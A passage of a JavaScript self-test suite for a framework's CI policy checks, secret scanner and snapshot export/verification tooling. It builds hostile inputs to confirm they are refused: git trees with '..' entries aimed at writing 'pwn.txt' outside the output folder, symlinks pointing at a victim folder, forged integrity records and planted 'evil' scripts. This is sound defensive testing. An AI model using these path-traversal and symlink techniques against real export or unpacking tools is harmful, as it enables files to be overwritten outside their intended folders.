  ['ci: a manifest cannot make the repository-wide scans look at a decoy folder (paths.repositoryRoot must be the git repository the project is in), and ci.framework is honoured only in the framework repository (a client with a copy of the action or a ci.framework key is refused)', () => {
    const out = [];
    const bad = withCopy((d) => {
      const site = join(d, 'site'); mkdirSync(site, { recursive: true }); cpSync(FIXTURE, site, { recursive: true });
      editJson(site, 'sts.engineering.json', (m) => { m.paths.repositoryRoot = '.'; });
      return inProject(site, `const { project } = await L('lib/project.mjs'); const { manifestProblems } = await L('checks/project.mjs'); out(manifestProblems(project));`);
    });
    if (!bad.some((x) => /paths\.repositoryRoot resolves to .* but the project is in the git repository/.test(x))) out.push(`a repositoryRoot that is not the git repository was not reported (${bad[0] || 'nothing'})`);
    if (IN_FRAMEWORK()) {
      const run = spawnSync(process.execPath, [join(coreDir, 'checks', 'ci.mjs')], { env: { ...process.env, STS_PROJECT_DIR: FIXTURE, GITHUB_REPOSITORY: 'getsimplifiedtech/a-private-client' }, cwd: FIXTURE, encoding: 'utf8' });
      const t = run.stdout + run.stderr;
      if (run.status === 0 || !/ci\.framework is for the framework repository/.test(t)) out.push('ci.framework was honoured in another repository');
      if (!/a copy of the framework's action in getsimplifiedtech\/a-private-client/.test(t)) out.push('a copy of the action in a client repository was not reported');
    }
    return out;
  }, null],
  ['ci: smaller policy holes are closed: a job with no body does not crash the check, an "on" and a "true" key together, two schedule entries, a branch spelled Main or refs/heads/main, an environment variable of the action under another name, an extra script, a script that ignores a failure, a folder called claude-demo is accepted', () => {
    const ctx = CI_CTX(), out = [], v = { sha: SHA_A, projectDir: 'site', branch: 'development' };
    const text = render('caller', v, { ctx }), sched = render('scheduled', v, { ctx });
    const must = (what, problems, re) => { const t = problems.join('\n'); if (!t || !re.test(t)) out.push(`${what}: ${t ? 'refused for another reason: ' + t.slice(0, 100) : 'accepted'}`); };
    try { must('a job with no body', callerProblems(text.replace(/  lighthouse:\n[\s\S]*?\n\n/, '  lighthouse:\n\n'), ctx).problems, /is not a mapping|missing/); } catch (e) { out.push(`a job with no body crashed the check: ${e.message}`); }
    must('on and true together', callerProblems(text.replace('\non:\n', '\ntrue:\n  schedule:\n    - cron: "1 1 * * *"\non:\n'), ctx).problems, /both an "on" and a "true" key/);
    must('two schedule entries', callerProblems(sched.replace("    - cron: '17 4 * * 1'\n", "    - cron: '17 4 * * 1'\n    - cron: '17 5 * * 1'\n"), ctx, { kind: 'scheduled' }).problems, /exactly one schedule entry/);
    for (const b of ['Main', 'refs/heads/main', 'a..b', 'x.lock']) { try { render('caller', { ...v, branch: b }, { ctx }); out.push(`branch ${b} was accepted`); } catch { /* refused */ } }
    try { render('caller', { ...v, projectDir: 'sites/claude-demo', branch: 'claude/fix-a' }, { ctx }); } catch (e) { out.push(`a folder or branch that merely contains a word was refused: ${e.message.split('\n')[1] || e.message}`); }
    const fw = join(coreDir, '..', '.github', 'actions', 'engineering', 'action.yml'), sc = join(coreDir, 'tools', 'ci');
    if (existsSync(fw)) {
      const a = readFileSync(fw, 'utf8');
      must('an action variable under another name', actionProblems(a.replace('        PROJECT_DIR: ${{ inputs.project-dir }}\n      run: bash "$GITHUB_ACTION_PATH/../../../engineering/tools/ci/run.sh"', '        PROJECT_DIR: ${{ inputs.project-dir }}\n        STS_CORE_DIR: ${{ github.action_ref }}\n      run: bash "$GITHUB_ACTION_PATH/../../../engineering/tools/ci/run.sh"'), ctx), /environment STS_CORE_DIR may only be/);
      const scripts = Object.fromEntries(readdirSync(sc).filter((f) => f.endsWith('.sh')).map((f) => [f.replace(/\.sh$/, ''), readFileSync(join(sc, f), 'utf8')]));
      must('an extra script', scriptProblems({ ...scripts, evil: 'echo evil\n' }, ctx), /is not one of the scripts the action runs/);
      must('a script that exits 0 early', scriptProblems({ ...scripts, guard: scripts.guard.replace('set -euo pipefail\n', 'set -euo pipefail\nexit 0\n') }, ctx), /ignores a failure/);
    }
    return out;
  }, null],
  ['secrets: a file named like a history prefix does not hide a finding, and a secret committed at the reviewed path and later deleted is still a finding (the allowance covers the lines of the reviewed file only)', () => withCopy((d) => inProject(d, `
const { checkSecrets } = await L('checks/secrets.mjs'); const fs = await import('node:fs'); const { createHash } = await import('node:crypto'); const { join } = await import('node:path'); const { execFileSync } = await import('node:child_process');
const root = process.cwd(), found = [], f = 'vendor/t/test_a.py', git = (...a) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid', ...a], { cwd: root, stdio: 'ignore' });
const good = 'api_key = "' + 'x'.repeat(8) + '-placeholder-' + 'y'.repeat(12) + '"\\n', bad = 'api_key = "' + 'real'.repeat(6) + '"\\n';
const hash = (t) => createHash('sha256').update(t).digest('hex');
const allow = { entries: [{ file: f, rule: 'secret-assignment', sha256: hash(good), count: 1, allowAbsent: true, reason: 'a reviewed offline placeholder in a unit test, not a credential for any service' }] };
const expect = (what, got, re) => { if (re === null ? got : (!got || !re.test(got))) found.push(what + ': ' + (got ? 'reported ' + got.slice(0, 160) : 'nothing reported')); };
fs.mkdirSync(join(root, 'vendor/t'), { recursive: true });
const lookalike = 'abcdef0:' + f; fs.mkdirSync(join(root, 'abcdef0:vendor/t'), { recursive: true }); fs.writeFileSync(join(root, lookalike), bad);
expect('a file named like a history prefix', checkSecrets({ root, history: false, allow }).problems.join('\\n'), /looks like a secret-assignment/);
fs.rmSync(join(root, 'abcdef0:vendor'), { recursive: true });
git('add', '-A'); git('commit', '-qm', 'base');
fs.writeFileSync(join(root, f), bad); git('add', '-f', f); git('commit', '-qm', 'a real-looking secret at the reviewed path'); fs.rmSync(join(root, f)); git('add', '-A'); git('commit', '-qm', 'removed');
expect('a secret committed at the reviewed path and deleted', checkSecrets({ root, history: true, allow }).problems.join('\\n'), /looks like a secret-assignment/);
out(found);`)), null],
  ['snapshot: the export of the engineering verifies in a consumer, equals the framework commit file by file, and its tree object id is the one git computes for the same files', () => withSnapshot((c) => {
    const out = [];
    const v = verifyRepo(c.out, verifyOpts); out.push(...v.problems);
    out.push(...verifyAgainst(c.record, c.src).problems);
    execFileSync('git', ['add', ...c.record.roots.filter((r) => existsSync(join(c.out, r)))], { cwd: c.out });
    const real = execFileSync('git', ['write-tree'], { cwd: c.out, encoding: 'utf8' }).trim();
    if (real !== c.record.snapshotTree) out.push(`git computes ${real} for the exported files, the record says ${c.record.snapshotTree}`);
    if (!c.record.files.some((f) => f.path === 'engineering/lib/authenticity.mjs') || c.record.protected['engineering/lib/authenticity.mjs'] !== PROTECTED_SHA256['engineering/lib/authenticity.mjs']) out.push('the production hard stop is not carried at its pinned hash');
    const kept = c.record.files.filter((f) => /EXTRACTION-MANIFEST|ci\/exceptions\.json|^engineering\/docs\//i.test(f.path));
    if (kept.length) out.push(`files that must stay private are in the snapshot: ${kept.map((f) => f.path).join(', ')}`);
    return out;
  }), null],
  ['snapshot: a byte changed in a copied file, a file added, a file removed, a file made executable, a link instead of a file, a file added to the action folder: each is refused by the consumer\'s own check', () => {
    const cases = [
      ['a byte changed', (c) => { const f = join(c.out, 'engineering', 'lib', 'git.mjs'); writeFileSync(f, `${readFileSync(f, 'utf8')}\n// x\n`); }, /lib\/git\.mjs: .*differs from the record|bytes, the record says/],
      ['a file added', (c) => writeFileSync(join(c.out, 'engineering', 'lib', 'extra.mjs'), 'export {}\n'), /extra\.mjs: is in the snapshot folders but not in the record/],
      ['a file removed', (c) => rmSync(join(c.out, 'engineering', 'lib', 'git.mjs')), /git\.mjs: is in the record but missing/],
      ['a file made executable', (c) => chmodSync(join(c.out, 'engineering', 'lib', 'git.mjs'), 0o755), /mode 100755, the record says 100644/],
      ['a link instead of a file', (c) => { const f = join(c.out, 'engineering', 'lib', 'git.mjs'); rmSync(f); symlinkSync(join(c.out, 'engineering', 'lib', 'zip.mjs'), f); }, /git\.mjs: is not a regular file/],
      ['a file added to the action folder', (c) => { mkdirSync(join(c.out, '.github', 'actions', 'engineering'), { recursive: true }); writeFileSync(join(c.out, '.github', 'actions', 'engineering', 'extra.sh'), 'echo x\n'); }, /extra\.sh: is in the snapshot folders but not in the record/],
    ];
    const out = [];
    for (const [name, damage, re] of cases) {
      let r; try { r = snapCase(damage).join('\n'); } catch (e) { r = `crashed: ${e.message}`; }
      if (!r) out.push(`accepted: ${name}`); else if (!re.test(r)) out.push(`${name}: refused for another reason (${r.slice(0, 140)})`);
    }
    return out;
  }, null],
  ['snapshot: a record that lies is refused: a file listed with another checksum, a file dropped from the list, an excluded file listed, a wrong commit format, another framework repository, a tampered tree id, and the production hard stop changed with the record made to agree', () => {
    const cases = [
      ['another checksum', (c) => editRecord(c.out, (r) => { r.files[3].sha256 = 'f'.repeat(64); }), /SHA-256 differs from the record/],
      ['a file dropped from the list', (c) => editRecord(c.out, (r) => { r.files = r.files.filter((f) => f.path !== 'engineering/lib/git.mjs'); }), /git\.mjs: is in the snapshot folders but not in the record/],
      ['a wrong commit format', (c) => editRecord(c.out, (r) => { r.framework.commit = 'main'; }), /full 40-hex ids/],
      ['another framework repository', (c) => editRecord(c.out, (r) => { r.framework.repository = 'someone/else'; }), /framework repository must be/],
      ['a tampered tree id', (c) => editRecord(c.out, (r) => { r.snapshotTree = 'a'.repeat(40); }), /snapshotTree does not match the files it lists/],
      ['an excluded file listed', (c) => { const f = join(c.out, 'engineering', 'docs'); mkdirSync(f, { recursive: true }); const body = Buffer.from('x\n'); writeFileSync(join(f, 'x.md'), body); editRecord(c.out, (r) => { r.files.push({ path: 'engineering/docs/x.md', mode: '100644', blob: blobOid(body), sha256: createHash('sha256').update(body).digest('hex'), bytes: body.length }); r.files.sort((a, b) => (a.path < b.path ? -1 : 1)); r.snapshotTree = treeOid(r.files); }); }, /the profile excludes this file/],
      ['the hard stop changed, the record made to agree', (c) => { const rel = 'engineering/lib/authenticity.mjs', f = join(c.out, rel), body = Buffer.from(`${readFileSync(f, 'utf8')}\n// weakened\n`); writeFileSync(f, body); editRecord(c.out, (r) => { const e = r.files.find((x) => x.path === rel); e.sha256 = createHash('sha256').update(body).digest('hex'); e.blob = blobOid(body); e.bytes = body.length; r.protected[rel] = e.sha256; r.snapshotTree = treeOid(r.files); }); }, /pins|protected hash differs from the pinned one/],
    ];
    const out = [];
    for (const [name, damage, re] of cases) {
      let r; try { r = snapCase(damage).join('\n'); } catch (e) { r = `crashed: ${e.message}`; }
      if (!r) out.push(`accepted: ${name}`); else if (!re.test(r)) out.push(`${name}: refused for another reason (${r.slice(0, 140)})`);
    }
    return out;
  }, null],
  ['snapshot: the record is bound to the files in every field: a dangling link, a hidden folder in a copy without git, a changed class, wrong totals, an unknown key and a null record are refused, and the hard stop is pinned even when the verifier is run alone', () => {
    const cases = [
      ['a dangling link in place of a file', (c) => { const f = join(c.out, 'engineering', 'lib', 'git.mjs'); rmSync(f); symlinkSync('/nonexistent-target', f); }, /git\.mjs: is not a regular file/],
      ['a dangling link added beside the files', (c) => symlinkSync('/nonexistent-target', join(c.out, 'engineering', 'lib', 'ghost.mjs')), /ghost\.mjs: is in the snapshot folders but not in the record/],
      ['a file inside a node_modules folder below the root, in a copy without git', (c) => { rmSync(join(c.out, '.git'), { recursive: true, force: true }); mkdirSync(join(c.out, 'engineering', 'lib', 'node_modules'), { recursive: true }); writeFileSync(join(c.out, 'engineering', 'lib', 'node_modules', 'evil.mjs'), 'export {}\n'); }, /node_modules\/evil\.mjs: is in the snapshot folders but not in the record/],
      ['a changed class (the purity scan would skip the file)', (c) => editRecord(c.out, (r) => { r.files.find((f) => f.path === 'engineering/lib/git.mjs').class = 'devtool'; }), /git\.mjs: the record says class devtool, the profile says none/],
      ['wrong totals', (c) => editRecord(c.out, (r) => { r.totals.files += 1; }), /totals are missing or do not match/],
      ['no totals', (c) => editRecord(c.out, (r) => { delete r.totals; }), /totals are missing or do not match/],
      ['an unknown key in the record', (c) => editRecord(c.out, (r) => { r.note = 'x'; }), /the unknown key note/],
      ['an unknown key in a file entry', (c) => editRecord(c.out, (r) => { r.files[0].extra = 1; }), /the unknown key extra/],
      ['a path with a parent segment', (c) => editRecord(c.out, (r) => { r.files[0].path = 'engineering/../x'; }), /has the segment "\.\."/],
      ['a null record', (c) => writeFileSync(join(c.out, SNAPSHOT_RECORD), 'null'), /is not a JSON object/],
      ['the hard stop changed with the record made to agree, the verifier given no pin of its own', (c) => { const rel = 'engineering/lib/authenticity.mjs', f = join(c.out, rel), body = Buffer.from(`${readFileSync(f, 'utf8')}\n// weakened\n`); writeFileSync(f, body); editRecord(c.out, (r) => { const e = r.files.find((x) => x.path === rel); e.sha256 = createHash('sha256').update(body).digest('hex'); e.blob = blobOid(body); e.bytes = body.length; r.protected[rel] = e.sha256; r.snapshotTree = treeOid(r.files); }); }, /pins|protected hash differs from the pinned one/],
    ];
    const out = [];
    for (const [name, damage, re] of cases) {
      let r; try { r = withSnapshot((c) => { damage(c); return verifyRepo(c.out).problems; }).join('\n'); } catch (e) { r = `crashed: ${e.message}`; }
      if (!r) out.push(`accepted: ${name}`); else if (!re.test(r)) out.push(`${name}: refused for another reason (${r.slice(0, 140)})`);
    }
    return out;
  }, null],
  ['snapshot: the producer writes only inside the output folder it is given: a path with a parent segment, an output folder inside the framework (also through a link), a folder that is not a snapshot under --replace, a tree that is not the approved one and a notice that still asks for a decision are refused before anything is written', () => withSnapshot((c) => {
    const out = [], tmp = c.root;
    const commitOf = (dir) => execFileSync('git', ['rev-parse', 'HEAD'], { cwd: dir, encoding: 'utf8' }).trim();
    const gitIn = (dir, ...a) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid', ...a], { cwd: dir, encoding: 'utf8' }).trim();
    const refuse = (what, fn, re) => { let m = ''; try { fn(); } catch (e) { m = e.message; } if (!m) out.push(`accepted: ${what}`); else if (!re.test(m)) out.push(`${what}: refused for another reason (${m.slice(0, 140)})`); };
    // a commit whose tree holds an entry named ".." (git accepts it in a tree object)
    const src2 = join(tmp, 'fw2'); cpSync(c.src, src2, { recursive: true });
    const blob = execFileSync('git', ['hash-object', '-w', '--stdin'], { cwd: src2, input: 'pwn\n', encoding: 'utf8' }).trim();
    const mk = (lines) => execFileSync('git', ['mktree'], { cwd: src2, input: lines, encoding: 'utf8' }).trim();
    let t = mk(`100644 blob ${blob}\tpwn.txt\n`);
    for (let i = 0; i < 3; i++) t = mk(`040000 tree ${t}\t..\n`);
    const engineeringTree = gitIn(src2, 'rev-parse', 'HEAD:engineering');
    const listing = execFileSync('git', ['ls-tree', engineeringTree], { cwd: src2, encoding: 'utf8' });
    const e2 = mk(`${listing}040000 tree ${t}\tx\n`);
    const rootEntries = execFileSync('git', ['ls-tree', 'HEAD'], { cwd: src2, encoding: 'utf8' }).split('\n').filter((l) => l && !/\tengineering$/.test(l));
    const top = mk(`${[...rootEntries, `040000 tree ${e2}\tengineering`].join('\n')}\n`);
    const evil = gitIn(src2, 'commit-tree', top, '-m', 'a tree with parent segments');
    const dest = join(tmp, 'sink', 'out');
    refuse('a tree with a ".." entry', () => exportSnapshot({ source: src2, commit: evil, out: dest, allowPlaceholders: true }), /has the segment "\.\."/);
    if (existsSync(join(tmp, 'sink', 'pwn.txt')) || existsSync(join(tmp, 'pwn.txt')) || existsSync(dest)) out.push('a file or folder was written before the refusal');
    // an output folder inside the framework, reached through a link
    symlinkSync(c.src, join(tmp, 'link-to-framework'));
    refuse('an output folder reached through a link into the framework', () => exportSnapshot({ source: c.src, commit: c.commit, out: join(tmp, 'link-to-framework', 'sub'), allowPlaceholders: true }), /inside the framework repository/);
    refuse('a missing --out', () => exportSnapshot({ source: c.src, commit: c.commit, allowPlaceholders: true }), /--out .* is required/);
    // a link inside the output folder never carries a write or a removal out of it
    const victim = join(tmp, 'victim'); mkdirSync(join(victim, 'actions', 'engineering'), { recursive: true }); writeFileSync(join(victim, 'actions', 'engineering', 'precious.txt'), 'keep\n');
    const viaLink = join(tmp, 'via-link'); exportSnapshot({ source: c.src, commit: c.commit, out: viaLink, allowPlaceholders: true });
    rmSync(join(viaLink, '.github', 'actions'), { recursive: true, force: true }); mkdirSync(join(viaLink, '.github'), { recursive: true }); symlinkSync(join(victim, 'actions'), join(viaLink, '.github', 'actions'));
    refuse('--replace through a link in the output folder', () => exportSnapshot({ source: c.src, commit: c.commit, out: viaLink, replace: true, allowPlaceholders: true }), /is a link/);
    if (!existsSync(join(victim, 'actions', 'engineering', 'precious.txt'))) out.push('--replace removed a file through a link');
    const linkedRecord = join(tmp, 'linked-record'); mkdirSync(linkedRecord); writeFileSync(join(tmp, 'target.txt'), 'untouched\n'); symlinkSync(join(tmp, 'target.txt'), join(linkedRecord, SNAPSHOT_RECORD));
    refuse('a record file that is a link', () => exportSnapshot({ source: c.src, commit: c.commit, out: linkedRecord, allowPlaceholders: true }), /is a link/);
    if (readFileSync(join(tmp, 'target.txt'), 'utf8') !== 'untouched\n') out.push('the record was written through a link');
    const ancestor = join(tmp, 'ancestor'); mkdirSync(ancestor); symlinkSync(join(tmp, 'sink2'), join(ancestor, '.github')); mkdirSync(join(tmp, 'sink2'));
    refuse('a link as an ancestor of a file', () => exportSnapshot({ source: c.src, commit: c.commit, out: ancestor, allowPlaceholders: true }), /is a link/);
    if (readdirSync(join(tmp, 'sink2')).length) out.push('a folder was created through a link before the refusal');
    refuse('an output folder below a link into the framework creates nothing', () => exportSnapshot({ source: c.src, commit: c.commit, out: join(tmp, 'link-to-framework', 'deep', 'er'), allowPlaceholders: true }), /inside the framework repository/);
    if (existsSync(join(c.src, 'deep'))) out.push('a folder was created in the framework before the refusal');
    // --replace needs a valid record of this framework with the same folders, and no file in them that the record does not list
    const foreign = join(tmp, 'foreign'); exportSnapshot({ source: c.src, commit: c.commit, out: foreign, allowPlaceholders: true }); writeFileSync(join(foreign, 'engineering', 'mine.txt'), 'mine\n');
    refuse('--replace over a snapshot folder that holds a file of someone else', () => exportSnapshot({ source: c.src, commit: c.commit, out: foreign, replace: true, allowPlaceholders: true }), /refusing to remove folders that were not written by this tool/);
    if (!existsSync(join(foreign, 'engineering', 'mine.txt'))) out.push('--replace removed a file of someone else');
    // the command line: a flag with its value after an equals sign is honoured, a flag without its value is refused (never read as "no limit")
    const cli = (...a) => spawnSync(process.execPath, [join(coreDir, 'tools', 'snapshot.mjs'), 'export', '--source', c.src, '--commit', c.commit, '--out', join(tmp, `cli-${a.length}${a.join('').length}`), '--allow-placeholders', ...a], { encoding: 'utf8' });
    const eq = cli(`--expect-tree=${'d'.repeat(40)}`); if (eq.status === 0 || !/not the approved/.test(eq.stderr)) out.push(`--expect-tree=<wrong id> was not refused (exit ${eq.status})`);
    const novalue = cli('--expect-tree'); if (novalue.status !== 2 || !/needs a value/.test(novalue.stderr)) out.push(`--expect-tree without a value was not refused (exit ${novalue.status})`);
    const unknown = cli('--expect-trees', 'x'); if (unknown.status !== 2 || !/unknown flag/.test(unknown.stderr)) out.push(`an unknown flag was not refused (exit ${unknown.status})`);
    const other = join(tmp, 'other'); mkdirSync(join(other, 'engineering'), { recursive: true }); writeFileSync(join(other, 'engineering', 'mine.txt'), 'mine\n'); writeFileSync(join(other, SNAPSHOT_RECORD), '{}');
    refuse('--replace over a folder with a record of {}', () => exportSnapshot({ source: c.src, commit: c.commit, out: other, replace: true, allowPlaceholders: true }), /refusing to remove folders that were not written by this tool/);
    if (!existsSync(join(other, 'engineering', 'mine.txt'))) out.push('--replace removed a folder that was not a snapshot');
    // the approved tree
    refuse('a tree that is not the approved one', () => exportSnapshot({ source: c.src, commit: c.commit, out: join(tmp, 'o2'), expectTree: 'd'.repeat(40), allowPlaceholders: true }), /not the approved/);
    exportSnapshot({ source: c.src, commit: c.commit, out: join(tmp, 'o3'), expectTree: c.record.snapshotTree, allowPlaceholders: true });
    // a notice that still asks a person to decide
    const src3 = join(tmp, 'fw3'); cpSync(c.src, src3, { recursive: true });
    writeFileSync(join(src3, 'engineering', 'NOTICE.md'), 'Copyright [to be confirmed: the legal name]\n'); gitIn(src3, 'add', '-A'); gitIn(src3, 'commit', '-q', '-m', 'notice with a placeholder');
    refuse('a notice with a placeholder', () => exportSnapshot({ source: src3, commit: commitOf(src3), out: join(tmp, 'o4') }), /still contains "\[to be confirmed\]"/);
    return out;
  }), null],
  ['snapshot: a file changed together with its record passes the consumer\'s own check, as it must (a public repository cannot see the private commit), and is refused against the framework repository; so are a wrong commit and a profile that is not the commit\'s', () => {
    const out = [];
    const forged = snapCase((c) => { const f = join(c.out, 'engineering', 'lib', 'git.mjs'), body = Buffer.from(`${readFileSync(f, 'utf8')}\n// forged\n`); writeFileSync(f, body); editRecord(c.out, (r) => { const e = r.files.find((x) => x.path === 'engineering/lib/git.mjs'); e.sha256 = createHash('sha256').update(body).digest('hex'); e.blob = blobOid(body); e.bytes = body.length; r.snapshotTree = treeOid(r.files); r.totals.bytes = r.files.reduce((n, x) => n + x.bytes, 0); }); });
    if (forged.length) out.push(`a consistent record was refused by the consumer's own check: ${forged[0]}`);
    const against = snapCase((c) => { const f = join(c.out, 'engineering', 'lib', 'git.mjs'), body = Buffer.from(`${readFileSync(f, 'utf8')}\n// forged\n`); writeFileSync(f, body); editRecord(c.out, (r) => { const e = r.files.find((x) => x.path === 'engineering/lib/git.mjs'); e.sha256 = createHash('sha256').update(body).digest('hex'); e.blob = blobOid(body); e.bytes = body.length; r.snapshotTree = treeOid(r.files); r.totals.bytes = r.files.reduce((n, x) => n + x.bytes, 0); }); }, { against: true }).join('\n');
    if (!/git\.mjs: differs from the commit/.test(against) || !/snapshot tree computed from the commit differs/.test(against)) out.push(`the forged copy was not refused against the framework repository (${against.slice(0, 160) || 'nothing'})`);
    const wrongCommit = snapCase((c) => editRecord(c.out, (r) => { r.framework.commit = 'b'.repeat(40); }), { against: true }).join('\n');
    if (!/the commit cannot be read/.test(wrongCommit)) out.push(`a commit that is not in the framework repository was not refused (${wrongCommit.slice(0, 120) || 'nothing'})`);
    const wrongTree = snapCase((c) => editRecord(c.out, (r) => { r.framework.tree = 'c'.repeat(40); }), { against: true }).join('\n');
    if (!/the commit's tree is/.test(wrongTree)) out.push('a commit tree that is not the commit\'s was not refused');
    return out;
  }, null],
  ['snapshot: check:extraction in snapshot mode accepts the verified copy, refuses a tampered one, refuses a consumer that deletes the record (the private ledger is not in a snapshot), and refuses a ledger beside a record', () => withSnapshot(async (c) => {
    const out = [], core = join(c.out, 'engineering');
    const LISTED = 'getsimplifiedtech/STS-Cinematic-Showcase.';
    const ok = await checkExtraction({ core, identity: LISTED }); out.push(...ok.problems);
    if (!/snapshot of getsimplifiedtech\/sts-web-design-framework at /.test(ok.notes.join('\n'))) out.push('snapshot mode did not report the snapshot');
    const f = join(core, 'lib', 'git.mjs'); const keep = readFileSync(f); writeFileSync(f, `${keep}\n// x\n`);
    if (!(await checkExtraction({ core, identity: LISTED })).problems.length) out.push('a tampered copy passed check:extraction');
    writeFileSync(f, keep);
    const rec = join(c.out, SNAPSHOT_RECORD), saved = readFileSync(rec); rmSync(rec);
    const gone = (await checkExtraction({ core, identity: null })).problems.join('\n');
    if (!/neither EXTRACTION-MANIFEST\.json .* nor sts-framework-snapshot\.json/.test(gone)) out.push(`a consumer without a record was not refused (${gone.slice(0, 120) || 'nothing'})`);
    // a listed repository cannot fall back to the framework mode by deleting the record and writing a manifest and a ledger tool of its own
    writeFileSync(join(core, 'EXTRACTION-MANIFEST.json'), JSON.stringify({ source: { commit: 'a'.repeat(40) }, files: [], changes: [], protected: [] }));
    mkdirSync(join(core, 'tools'), { recursive: true });
    const fallback = (await checkExtraction({ core, identity: LISTED })).problems.join('\n');
    if (!/sts-framework-snapshot\.json is missing: .* carries the framework as a verified snapshot/.test(fallback)) out.push(`a listed repository fell back to the framework mode (${fallback.slice(0, 120) || 'nothing'})`);
    rmSync(join(core, 'EXTRACTION-MANIFEST.json'));
    writeFileSync(rec, saved); writeFileSync(join(core, 'EXTRACTION-MANIFEST.json'), '{}');
    const both = (await checkExtraction({ core, identity: LISTED })).problems.join('\n');
    if (!/never carries the private ledger/.test(both)) out.push('a ledger beside a record was not refused');
    return out;
  }), null],
  ['snapshot: the snapshot caller renders and passes the policy; a remote action, another local action, a step of its own, a non-blocking verification are refused; it is accepted only where a verified snapshot is carried by a repository on the list', () => withSnapshot((c) => {
    const ctx = CI_CTX(), out = [], v = { projectDir: 'site', branch: 'development' };
    const text = render('snapshot-caller', { sha: undefined, ...v }, { ctx });
    const must = (what, t, re) => { const r = callerProblems(t, ctx, { kind: 'caller', snapshot: true }).problems.join('\n'); if (re === null ? r : (!r || !re.test(r))) out.push(`${what}: ${r ? 'reported ' + r.slice(0, 120) : 'accepted'}`); };
    must('the untouched snapshot caller', text, null);
    must('the framework\'s remote action in a snapshot caller', text.replaceAll('./.github/actions/engineering', `getsimplifiedtech/sts-web-design-framework/.github/actions/engineering@${SHA_A}`), /must use \.\/\.github\/actions\/engineering/);
    must('another local action', text.replace('./.github/actions/engineering', './.github/actions/mine'), /must use \.\/\.github\/actions\/engineering/);
    must('a step of the repository\'s own', text.replace('      - name: Verify (all checks, self-tests)\n', '      - name: Tidy\n        run: echo tidy\n      - name: Verify (all checks, self-tests)\n'), /exactly two steps/);
    must('the blocking verification allowed to fail', text.replace('    runs-on: ubuntu-24.04\n    timeout-minutes: 40\n', '    runs-on: ubuntu-24.04\n    timeout-minutes: 40\n    continue-on-error: true\n'), /continue-on-error/);
    must('the fast mode where the whole verification belongs', text.replace('mode: verify', 'mode: fast'), /mode must be verify|has mode "fast"/);
    // the remote-style policy refuses the snapshot caller (a private client must use the SHA-pinned action), and the file-level check refuses it unless a snapshot is allowed
    if (!callerProblems(text, ctx, { kind: 'caller' }).problems.length) out.push('the remote-style caller policy accepted a snapshot caller');
    if (!/accepted only in a repository on the snapshot list/.test(checkCiFile(text, { docs: false, snapshot: false }).problems.join('\n'))) out.push('a snapshot caller was accepted where no verified snapshot is carried');
    if (checkCiFile(text, { docs: false, snapshot: true, ctx }).problems.length) out.push(`a snapshot caller was refused where a verified snapshot is carried: ${checkCiFile(text, { docs: false, snapshot: true, ctx }).problems[0]}`);
    // the status of a repository: listed and verified; not listed; verified but damaged; no record
    const listed = 'getsimplifiedtech/STS-Cinematic-Showcase.';
    if (!snapshotStatus(c.out, listed).ok) out.push(`a verified snapshot in the listed repository is refused: ${snapshotStatus(c.out, listed).problems[0]}`);
    if (!/is not a repository that may carry the framework as a snapshot/.test(snapshotStatus(c.out, 'getsimplifiedtech/a-private-client').problems.join('\n'))) out.push('a private client repository may carry a snapshot');
    if (snapshotStatus(c.out, null).ok !== true) out.push('a scratch copy whose repository cannot be told is refused instead of judged');
    writeFileSync(join(c.out, 'engineering', 'lib', 'git.mjs'), 'x');
    if (snapshotStatus(c.out, listed).ok) out.push('a damaged snapshot is accepted as verified');
    rmSync(join(c.out, SNAPSHOT_RECORD));
    if (snapshotStatus(c.out, listed).present) out.push('a repository without a record is reported as carrying a snapshot');
    return out;
  }), null],
  ['snapshot: the public set is exactly what the profile selects: every file under the roots is classified, nothing is public by default, and a file no rule covers stops the producer', () => withSnapshot((c) => {
    const out = [];
    const inv = inventory(c.src, c.commit);
    if (inv.problems.length) out.push(...inv.problems);
    const profile = parseProfile(readFileSync(join(coreDir, 'ci', 'snapshot-profile.json'), 'utf8'));
    const rules = new Set(profile.rules.map((r) => r.pattern));
    for (const r of profile.rules) if (!inv.rows.some((x) => x.rule === r.pattern) && !/NOTICE|exceptions|EXTRACTION|docs\/\*\*|hosting\/\*\.md|extraction-ledger|verify-extraction|parity|reference-consumer|simulate-caller|README/.test(r.pattern) && !(r.pattern.startsWith('.github/') && !existsSync(join(coreDir, '..', '.github', 'actions')))) out.push(`the rule ${r.pattern} covers no file`);
    // a file that no rule covers
    const src2 = mkdtempSync(join(tmpdir(), 'sts-inv-'));
    try {
      cpSync(c.src, src2, { recursive: true });
      writeFileSync(join(src2, 'engineering', 'surprise.bin'), 'x');
      execFileSync('git', ['add', '-A'], { cwd: src2 }); execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid', 'commit', '-q', '-m', 'x'], { cwd: src2 });
      const sha = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: src2, encoding: 'utf8' }).trim();
      let refused = false; try { exportSnapshot({ source: src2, commit: sha, out: join(src2, '..', 'never-written') }); } catch (e) { refused = /matches no rule/.test(e.message); }
      if (!refused) out.push('a file no rule covers did not stop the producer');
    } finally { rmSync(src2, { recursive: true, force: true }); }
    void rules;
    return out;
  }), null],
  ['hosting: the fixture\'s delivered folder is staged by the Cloudflare Pages and the Vercel adapter, each bundle passes its own checks and carries the folder unaltered; the static adapter serves the extension style', () => inProject(FIXTURE, `
const { assembleCandidate } = await L('lib/site.mjs'); const { projectDir, listFiles, sha256, tempDir } = await L('lib/git.mjs');
const { renderBundle, readManifest, ADAPTERS } = await L('adapters/hosting/index.mjs'); const { checkBundle } = await L('adapters/hosting/common.mjs').catch(() => ({}));
const { readFileSync, rmSync } = await import('node:fs'); const { join } = await import('node:path');
const p = []; const site = assembleCandidate(projectDir, 'selftest-hosting'); rmSync(join(site, 'config'), { recursive: true, force: true });   // the delivered site is the pages and assets only
const delivered = new Map(listFiles(site).map((f) => [f, sha256(readFileSync(join(site, f)))]));
for (const id of ['cloudflare-pages', 'vercel', 'static']) {
  if (!ADAPTERS[id]) { p.push(id + ' is not a registered hosting adapter'); continue; }
  const out = join(tempDir('selftest-bundle'), 'bundle');
  try { renderBundle(id, { siteDir: site, outDir: out, urlStyle: id === 'static' ? 'extension' : 'clean' }); } catch (e) { p.push(id + ': ' + e.message.replace(/\\s+/g, ' ').slice(0, 300)); continue; }
  const m = readManifest(out); const root = join(out, m.siteRoot);
